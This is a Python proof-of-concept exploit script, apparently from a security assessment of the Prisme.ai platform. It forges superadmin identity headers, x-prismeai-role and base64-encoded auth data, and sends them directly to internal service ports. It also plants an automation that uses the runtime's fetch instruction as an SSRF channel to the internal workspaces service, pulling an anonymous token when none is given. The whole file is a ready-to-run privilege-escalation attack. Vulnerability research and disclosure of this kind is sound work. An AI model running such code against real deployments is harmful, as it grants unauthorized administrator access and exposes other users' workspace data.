#!/usr/bin/env python3
"""
PoC #14 — Downstream Header Trust: SuperAdmin Forgery
HIGH: Downstream services trust x-prismeai-role and x-prismeai-auth-data headers.
Exploitable if any downstream service is directly reachable (port exposure, SSRF).

Usage: python3 poc_14_header_trust_privesc.py --target dev.example.com
"""

import argparse
import requests
import json
import base64
import urllib3
urllib3.disable_warnings()

# Default internal service ports from docker-compose
SERVICES = {
    "workspaces": 3002,
    "runtime": 3003,
    "events": 3004,
}


def forge_auth_headers(user_id, email="admin@poc.test", role="superadmin"):
    """Create spoofed Prisme.ai internal headers."""
    auth_data = {
        "id": user_id,
        "email": email,
        "role": role,
        "superAdmin": True,
        "authData": {
            "email": email,
            "id": user_id,
        }
    }
    return {
        "x-prismeai-user-id": user_id,
        "x-prismeai-role": role,
        "x-prismeai-session-id": "poc-session",
        "x-prismeai-auth-data": base64.b64encode(json.dumps(auth_data).encode()).decode(),
        "Content-Type": "application/json",
    }


def test_direct_service_access(host, service_name, port, user_id):
    """Attempt to access downstream service directly with forged headers."""
    print(f"\n[*] Testing {service_name} on port {port}...")

    headers = forge_auth_headers(user_id)

    # Test various endpoints per service
    endpoints = {
        "workspaces": [
            ("GET", "/v2/workspaces"),
            ("GET", "/sys/readiness"),
        ],
        "runtime": [
            ("GET", "/sys/readiness"),
        ],
        "events": [
            ("GET", "/sys/readiness"),
            ("GET", "/v2/workspaces/any/events"),
        ],
    }

    base_url = f"http://{host}:{port}"
    found = False

    for method, path in endpoints.get(service_name, []):
        url = f"{base_url}{path}"
        try:
            if method == "GET":
                r = requests.get(url, headers=headers, verify=False, timeout=5)
            else:
                r = requests.post(url, headers=headers, json={}, verify=False, timeout=5)

            print(f"  {method} {path}: {r.status_code}")
            if r.status_code == 200:
                print(f"  [CRITICAL] Direct access with SuperAdmin headers accepted!")
                print(f"  Response: {r.text[:500]}")
                found = True
            elif r.status_code != 404:
                print(f"  Response: {r.text[:200]}")
        except requests.exceptions.ConnectionError:
            print(f"  [INFO] Port {port} not reachable")
            return False
        except Exception as e:
            print(f"  [ERROR] {e}")

    return found


def test_via_gateway_ssrf(gateway_url, token, workspace_id):
    """Test header injection via SSRF through the runtime fetch instruction."""
    print(f"\n[*] Testing SuperAdmin forgery via SSRF chain...")

    url = f"{gateway_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # Automation that fetches internal service with forged headers
    auth_data = base64.b64encode(json.dumps({
        "id": "ssrf-admin",
        "email": "admin@ssrf.poc",
        "superAdmin": True,
    }).encode()).decode()

    automation = {
        "slug": "poc-header-forgery",
        "name": "PoC Header Trust via SSRF",
        "trigger": {"events": ["poc.header.forge"]},
        "instructions": [
            {
                "fetch": {
                    "url": "http://workspaces:3002/v2/workspaces",
                    "method": "GET",
                    "headers": {
                        "x-prismeai-user-id": "ssrf-admin",
                        "x-prismeai-role": "superadmin",
                        "x-prismeai-auth-data": auth_data,
                    }
                },
                "output": "result"
            },
            {
                "emit": {
                    "event": "poc.header.result",
                    "payload": {
                        "status": "{{result.status}}",
                        "workspace_count": "{{result.body.length}}",
                        "body_preview": "{% json(result.body).substring(0, 500) %}",
                    }
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] SSRF + header forgery automation created!")
            print(f"  [INFO] Trigger 'poc.header.forge' and check poc.header.result")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC #14: Downstream Header Trust Privilege Escalation")
    parser.add_argument("--target", required=True, help="Target hostname")
    parser.add_argument("--user-id", default="poc-superadmin", help="User ID to forge")
    parser.add_argument("--gateway-url", default=None, help="Gateway URL for SSRF chain test")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    parser.add_argument("--workspace-id", default=None, help="Workspace ID for SSRF chain")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    print(f"[*] Target: {args.target}")
    print("=" * 60)

    # Test 1: Direct port access
    print("\n[*] Phase 1: Testing direct service port access...")
    results = {}
    for svc, port in SERVICES.items():
        results[f"direct_{svc}"] = test_direct_service_access(args.target, svc, port, args.user_id)

    # Test 2: SSRF chain (if gateway URL provided)
    if args.gateway_url and args.token and args.workspace_id:
        print("\n[*] Phase 2: Testing SSRF chain via gateway...")
        results["ssrf_chain"] = test_via_gateway_ssrf(args.gateway_url, args.token, args.workspace_id)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT REACHABLE / NOT VULNERABLE'}")


if __name__ == "__main__":
    main()
